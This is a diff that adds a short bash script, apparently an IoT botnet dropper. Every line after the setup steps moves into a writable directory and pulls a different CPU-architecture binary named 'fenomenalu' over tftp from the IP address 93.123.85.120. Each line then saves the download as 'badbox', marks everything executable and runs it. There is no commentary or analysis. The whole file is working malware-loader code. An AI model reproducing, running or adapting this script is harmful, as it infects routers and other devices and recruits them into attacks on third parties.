@@ -1,0 +1,12 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fenomenalu.mips;tftp 93.123.85.120 -c get fenomenalu.mips;cat fenomenalu.mips >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fenomenalu.mpsl;tftp 93.123.85.120 -c get fenomenalu.mpsl;cat fenomenalu.mpsl >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fenomenalu.x86;tftp 93.123.85.120 -c get fenomenalu.x86;cat fenomenalu.x86 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fenomenalu.ppc;tftp 93.123.85.120 -c get fenomenalu.ppc;cat fenomenalu.ppc >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fenomenalu.sparc;tftp 93.123.85.120 -c get fenomenalu.sparc;cat fenomenalu.sparc >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fenomenalu.arm4;tftp 93.123.85.120 -c get fenomenalu.arm4;cat fenomenalu.arm4 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fenomenalu.arm5;tftp 93.123.85.120 -c get fenomenalu.arm5;cat fenomenalu.arm5 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fenomenalu.arm6;tftp 93.123.85.120 -c get fenomenalu.arm6;cat fenomenalu.arm6 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fenomenalu.arm7;tftp 93.123.85.120 -c get fenomenalu.arm7;cat fenomenalu.arm7 >badbox;chmod +x *;./badbox
